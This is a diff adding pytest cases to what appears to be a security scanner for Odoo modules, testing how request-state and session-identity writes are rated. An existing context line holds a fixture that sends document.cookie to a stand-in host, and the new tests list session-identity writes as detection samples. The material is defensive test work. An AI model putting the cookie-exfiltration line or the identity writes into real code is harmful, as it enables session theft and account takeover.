@@ -614,3 +614,24 @@ def test_probe_py_tests_stay_low():
 def test_probe_js_in_prod_bundle_keeps_high():
     # a tests/ folder inside an asset glob ships to production: full severity
     assert ("js-cookie-leak", "high") in codes({"static/src/x/tests/a.js": "fetch('https://e.v/'+document.cookie);\n"})
+
+
+# ---------------------------------------------------------------- stock noise: request state is not a core patch
+@pytest.mark.parametrize("stmt", ["request.pricelist = p", "request.session.debug = '1'", "request.cart = c", "request.session.context = {}"])
+def test_request_state_not_core_patch(stmt):
+    c = codes(pyt(f"def f(p, c):\n    {stmt}\n"))
+    assert ("core-patch", "high") not in c and ("session-auth-write", "high") not in c, c
+
+
+@pytest.mark.parametrize("stmt", ["request.session.uid = 2", "request.session.session_token = t", "request.session.db = d", "request.env = e", "request.uid = 1"])
+def test_request_identity_write_high(stmt):
+    assert ("session-auth-write", "high") in codes(pyt(f"def f(t, d, e):\n    {stmt}\n"))
+
+
+def test_thread_local_not_core_patch():
+    src = "from odoo.service.server import thread_local\ndef f():\n    thread_local.rpc_model_method = 'a.b'\n"
+    assert ("core-patch", "high") not in codes(pyt(src))
+
+
+def test_context_default_login_not_privilege():
+    assert not has(_view('context="{\'default_login\': \'x\'}"'), "context-privilege-default")
